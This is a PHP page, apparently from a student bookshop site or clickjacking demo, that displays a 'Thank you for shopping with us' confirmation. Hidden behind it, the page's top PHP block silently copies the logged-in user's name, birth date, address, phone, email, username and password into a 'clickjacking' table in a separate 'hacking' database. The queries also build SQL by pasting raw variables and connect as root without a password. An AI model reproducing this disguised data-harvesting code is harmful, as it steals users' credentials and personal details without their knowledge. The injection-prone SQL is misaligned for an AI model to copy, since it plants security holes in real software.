<?php
ob_start();
include 'books.php';
ob_end_clean();
$connection1 = new mysqli('localhost','root','','studyportal');
$query1 = $connection1->query("SELECT * FROM register where username = '$login_session'");


if($query1->num_rows > 0){
    while($row = $query1->fetch_assoc()){
      $name = $row['name'];
      $birth = $row['dob'];
      $gender = $row['gender'];
      $address = $row['address'];
      $phone = $row['contact'];
      $mail = $row['email'];
      $user = $row['username'];
      $pass = $row['password'];
}}
$connection1->close();
$connection2 = new mysqli('localhost','root','','hacking');
$query2 = $connection2->query("INSERT into clickjacking(name,dob,gender,address,contact,email,username,password) values('$name','$birth','$gender','$address','$phone','$mail','$user','$pass')");

$connection2->close();

?>
<html>
    <head>
        <style>
            *{
  box-sizing:border-box;
}
body{
background: #ffffff;
background: linear-gradient(to bottom, #ffffff 0%,#e1e8ed 100%);
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#e1e8ed',GradientType=0 );
    height: 100%;
        margin: 0;
        background-repeat: no-repeat;
        background-attachment: fixed;
  
}

.wrapper-1{
  width:100%;
  height:100vh;
  display: flex;
flex-direction: column;
}
.wrapper-2{
  padding :30px;
  text-align:center;
}
h1{
    font-family: 'Kaushan Script', cursive;
  font-size:4em;
  letter-spacing:3px;
  color:#5892FF ;
  margin:0;
  margin-bottom:20px;
}
.wrapper-2 p{
  margin:0;
  font-size:1.3em;
  color:#aaa;
  font-family: 'Source Sans Pro', sans-serif;
  letter-spacing:1px;
}
.go-home{
  color:#fff;
  background:#5892FF;
  border:none;
  padding:10px 50px;
  margin:30px 0;
  border-radius:30px;
  text-transform:capitalize;
  box-shadow: 0 10px 16px 1px rgba(174, 199, 251, 1);
}
.footer-like{
  margin-top: auto; 
  background:#D7E6FE;
  padding:6px;
  text-align:center;
}
.footer-like p{
  margin:0;
  padding:4px;
  color:#5892FF;
  font-family: 'Source Sans Pro', sans-serif;
  letter-spacing:1px;
}
.footer-like p a{
  text-decoration:none;
  color:#5892FF;
  font-weight:600;
}

@media (min-width:360px){
  h1{
    font-size:4.5em;
  }
  .go-home{
    margin-bottom:20px;
  }
}

@media (min-width:600px){
  .content{
  max-width:1000px;
  margin:0 auto;
}
  .wrapper-1{
  height: initial;
  max-width:620px;
  margin:0 auto;
  margin-top:50px;
  box-shadow: 4px 8px 40px 8px rgba(88, 146, 255, 0.2);
}
  
}
</style>
</head>
    <body>        
<div class=content>
  <div class="wrapper-1">
    <div class="wrapper-2">
      <h1>Thank you !</h1>
      <p>Thanks for shopping with us.  </p>
      <p>You should receive a confirmation email soon  </p><br/>
      <br/>
      <a href="books.php" style="color:blue">
      go home</a>
    </div>
</div>
</div>

</body>
</html>